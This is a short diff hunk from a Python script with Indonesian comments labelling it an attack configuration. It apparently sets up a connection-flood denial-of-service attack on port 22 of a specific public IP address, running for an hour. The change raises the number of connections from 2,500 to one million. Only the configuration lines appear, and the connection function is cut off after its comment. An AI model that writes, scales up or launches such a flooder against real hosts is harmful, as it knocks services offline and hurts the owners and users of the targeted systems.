@@ -5,7 +5,7 @@ import time
 # Konfigurasi serangan
 target_host = "206.189.34.239"  # Host target
 target_port = 22  # Port target
-num_connections = 2500  # Jumlah koneksi
+num_connections = 1000000  # Jumlah koneksi
 attack_duration = 3600  # Durasi serangan (dalam detik)
 
 # Fungsi untuk membuat koneksi
